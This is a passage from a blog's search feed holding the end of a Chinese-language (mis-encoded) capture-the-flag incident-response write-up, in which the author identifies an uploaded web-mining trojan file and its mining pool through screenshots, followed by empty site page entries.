title="ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡4ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ†ææµé‡ï¼Œé»‘å®¢æ¤å…¥äº†ä¸€ä¸ªwebæŒ–çŸ¿æœ¨é©¬ï¼Œè¿™ä¸ªæœ¨é©¬ç°å®æƒ…å†µä¸‹ä¼šåœ¨ç”¨æˆ·è®¿é—®åæ¶ˆè€—ç”¨æˆ·çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿(æœ¬ç¯å¢ƒå·²åšæ— å®³åŒ–å¤„ç†)ï¼Œæäº¤é»‘å®¢ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶æ—¶çš„åˆå§‹åç§°ï¼Œæäº¤æ ¼å¼ï¼šflag&#123;xxx.xxx&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20250729232809143.png" alt="image-20250729232809143"></p><p>ç›´æ¥è§£å¯†webshellå°±okäº†</p><p><img src="/../images/image-20250729234332101.png" alt="image-20250729234332101"></p><p>map.php</p><h3 id="ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"><a href="#ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥" class="headerlink" title="ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥"></a>ã€ä»»åŠ¡5ã€‘å…¬äº¤è½¦ç³»ç»Ÿæ”»å‡»äº‹ä»¶æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åˆ†ææµé‡å¹¶ä¸Šæœºæ’æŸ¥ï¼Œé»‘å®¢æ¤å…¥çš„ç½‘é¡µæŒ–çŸ¿æœ¨é©¬æ‰€ä½¿ç”¨çš„çŸ¿æ± åœ°å€æ˜¯ä»€ä¹ˆï¼Œæäº¤çŸ¿æ± åœ°å€(æ’æŸ¥å®Œæ¯•åå¯ä»¥å°è¯•åˆ é™¤å®ƒ)æäº¤æ ¼å¼ï¼šflag&#123;xxxxxxx.xxxx.xxx:xxxx&#125;</span><br></pre></td></tr></table></figure><p>map.phpå˜æˆäº†index.phpï¼Œå»æ£€æµ‹ä¸€ä¸‹index.php</p><p><img src="/../images/image-20250729234906085.png" alt="image-20250729234906085"></p><p>æ··æ·†jsï¼Œè§£å¯†å°±èƒ½è·å¾—</p><p>ä¸ä¼šå¾ˆæ‡‚åŠ è§£å¯†ï¼Œç»™aiç©ä¸€ä¼šå»</p>]]></content>
      
      
      <categories>
          
          <category> solaråº”æ€¥å“åº”ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Who am I ?</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>friend</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
